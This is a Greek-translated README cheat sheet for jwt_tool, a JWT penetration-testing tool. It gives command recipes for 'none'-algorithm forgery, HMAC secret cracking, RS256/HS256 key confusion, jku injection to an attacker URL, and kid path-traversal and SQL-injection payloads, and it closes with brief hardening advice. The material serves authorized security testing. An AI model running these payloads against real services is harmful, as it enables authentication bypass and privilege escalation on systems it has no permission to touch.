<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪙 jwt_tool - Πλήρες φύλλο εξαπάτησης

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
       ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
       ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
       ██║██║ █╗ ██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ██   ██║██║███╗██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ╚█████╔╝╚███╔███╔╝   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
        All-in-One JSON Web Token Manipulation & Exploitation Suite
```
<p align="center">
  <img src="https://img.shields.io/badge/jwt__tool-Token_Exploitation-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Author-ticarpi-orange?style=for-the-badge" alt="ticarpi">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Ασφάλεια Ιστού">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="center">
  <b>🪙 Ισχυρό κιτ εργαλείων Python CLI για ανάλυση, παραβίαση, σφυρηλάτηση, σάρωση και διάρρηξη JSON Web Tokens (JWT)</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Επισκόπηση & JWT Anatomy](#-επισκόπηση--jwt-anatomy)
- [Εγκατάσταση] (#-εγκατάσταση)
- [Token Parsing & Inspection](#-token-parsing--inspection)
- [Αυτόματη σάρωση ευπάθειας (`-M at`)](#-automated-vulnerability-scanning--m-at)
- [Κοινά σενάρια εκμετάλλευσης](#-κοινά σενάρια εκμετάλλευσης)
  - [Σύγχυση αλγορίθμου / Καμία επίθεση (`none`)](#algorithm-confusion--none-attack-none)
  - [HMAC Secret Key Cracking] (#hmac-secret-key-cracking)
  - [Σύγχυση κλειδιού: RS256 σε HS256 με δημόσιο κλειδί](#key-confusion-rs256-to-hs256-with-public-key)
  - [Εγχυση κεφαλίδας: JKU, X5U & JWK Spoofing](#header-injection-jku-x5u--jwk-spoofing)
  - [KID Injection (SQLi & Path Traversal)](#kid-injection-sqli--path-traversal)
- [Payload Tampering & Forging Claims](#-payload-tampering--forging-claims)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & Hardening](#-defensive-considerations--hardening)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση & JWT Anatomy

Ένα JSON Web Token (RFC 7519) αποτελείται από τρία τμήματα με κωδικοποίηση Base64URL που χωρίζονται με τελείες (`.`):
`header.payload.signature`

1. **Κεφαλίδα:** Προσδιορίζει τον τύπο διακριτικού (`typ`) και τον αλγόριθμο υπογραφής (`alg`, π.χ., `HS256`, `RS256`, `none`).
2. **Ωφέλιμο φορτίο:** Περιέχει αξιώσεις χρηστών (`sub`, `role`, `admin`, `exp`).
3. **Υπογραφή:** Κατακερματισμός κρυπτογραφικής επαλήθευσης που αποτρέπει την παραβίαση από την πλευρά του πελάτη.

Δημιουργήθηκε από **ticarpi**, το **jwt_tool** αυτοματοποιεί τις δοκιμές για αρχιτεκτονικά ελαττώματα και ελαττώματα εφαρμογής στις ροές εργασιών ελέγχου ταυτότητας JWT σε API και σύγχρονες εφαρμογές Ιστού.

---

## 📥 Εγκατάσταση
```bash
# Clone the repository
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Install dependencies
pip install -r requirements.txt

# Run jwt_tool
python3 jwt_tool.py --help
```
---

## 🔍 Ανάλυση & Επιθεώρηση Token

Αποκωδικοποίηση και επιθεώρηση παραμέτρων κεφαλίδας και αξιώσεων ωφέλιμου φορτίου:
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
```
---

## ⚡ Αυτοματοποιημένη σάρωση ευπάθειας (`-M at`)

Εκκινήστε αυτοματοποιημένες σαρώσεις βιβλίων παιχνιδιών που δοκιμάζουν γνωστά τρωτά σημεία σε μια στοχευμένη υπηρεσία Ιστού:
```bash
# Run All Tests (-M at) sending requests to web endpoint
python3 jwt_tool.py <JWT_TOKEN> \
  -M at \
  -u "https://api.target.com/user/profile" \
  -rh "Authorization: Bearer <JWT_TOKEN>"
```
*Εκτελέστηκαν δοκιμές:*
- Απογύμνωση υπογραφής (Καμία παραλλαγή αλγορίθμου)
- Σύγχυση κλειδιού RSA σε HMAC
- Παραβίαση αξίωσης (`admin=true`, κλιμάκωση προνομίων)
- Έγχυση σε κεφαλίδες `kid`, `jku`, `x5u`
- Κενός χειρισμός υπογραφών

---

## 💥 Συνηθισμένα σενάρια εκμετάλλευσης

### Σύγχυση αλγορίθμου / Καμία επίθεση (`none`)
Όταν οι υλοποιήσεις backend δέχονται ανυπόγραφα διακριτικά:
```bash
# Forge token with 'none' algorithm and stripped signature
python3 jwt_tool.py <JWT_TOKEN> -X a
```
*Παραλλαγές που ελέγχονται αυτόματα:* `none`, `None`, `NONE`, `nOnE`.

### HMAC Secret Cracking
Όταν το HS256/HS384/HS512 χρησιμοποιεί αδύναμη φράση πρόσβασης:
```bash
# Dictionary attack using rockyou.txt
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```
### Σύγχυση κλειδιού: RS256 σε HS256 με δημόσιο κλειδί
Εάν ο διακομιστής υπογράψει με RSA (RS256) αλλά δέχεται HMAC (HS256) χρησιμοποιώντας το δημόσιο πιστοποιητικό του ως κοινόχρηστο κλειδί HMAC:
```bash
# Forge token using server public key file
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
```
### Header Injection: JKU, X5U & JWK Spoofing
Εισαγωγή κλειδιών ή διευθύνσεων URL που ελέγχονται από εισβολείς:
```bash
# Inject attacker-controlled JWKS URL in jku header
python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json" -S hs256 -k secret
```
### KID Injection (SQLi & Path Traversal)
Εάν το backend χρησιμοποιεί την παράμετρο κεφαλίδας `kid` (Key ID) απευθείας σε ερωτήματα βάσης δεδομένων ή διαδρομές αρχείων:
```bash
# Path traversal pointing to /dev/null (empty secret)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# SQL Injection in kid header to bypass signature verification
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'my_secret'--" -S hs256 -p "my_secret"
```
---

## ✍️ Απαιτήσεις παραβίασης ωφέλιμου φορτίου και παραποίησης

Τροποποιήστε συγκεκριμένες τιμές αξίωσης και παραιτηθείτε από το διακριτικό:
```bash
# Change claim 'admin' to true and 'role' to 'SuperAdmin' using known secret
python3 jwt_tool.py <JWT_TOKEN> \
  -T \
  -pc "admin" -pv "true" \
  -pc "role" -pv "SuperAdmin" \
  -k "secret_key"
```
---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Στόχος | Εντολή |
|-----------|---------|
| **Αποκωδικοποίηση και ανάλυση διακριτικού** | `python3 jwt_tool.py <JWT>` |
| **Σάρωση βιβλίων All-in-One** | `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
| **Crack HMAC Secret** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
| **Παράκαμψη με αλγόριθμο Κανένα** | `python3 jwt_tool.py <JWT> -X a` |
| **RS256 -> HS256 Σύγχυση** | `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
| **Παραβίαση ωφέλιμου φορτίου & υπογραφή** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
| **Διάβαση διαδρομής KID** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |

---

## 🛡️ Αμυντικές Θεωρήσεις & Σκλήρυνση

1. **Αυστηρή λίστα λευκών αλγορίθμων:** Ποτέ μην αποδεχτείτε το `none` ή την εναλλαγή αλγορίθμων. Επαληθεύστε ρητά τους αναμενόμενους αλγόριθμους (μόνο `RS256`).
2. **Απόρριψη κλειδιών που ελέγχονται από τον πελάτη:** Μην εμπιστεύεστε τυφλά τις κεφαλίδες `jku`, `jwk` ή `x5u` από μη αξιόπιστη εισαγωγή χωρίς αυστηρές λίστες επιτρεπόμενων τομέων.
3. **Χρησιμοποιήστε Strong Secrets:** Βεβαιωθείτε ότι τα κλειδιά HMAC είναι τουλάχιστον 256 bit κρυπτογραφικών τυχαίων byte υψηλής εντροπίας.

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Το jwt_tool έχει σχεδιαστεί αυστηρά για εξουσιοδοτημένες δοκιμές διείσδυσης, αξιολογήσεις ευπάθειας API και εκπαιδευτική έρευνα. Η σφυρηλάτηση κουπονιών για πρόσβαση σε μη εξουσιοδοτημένα συστήματα χωρίς γραπτή άδεια είναι αυστηρά παράνομη.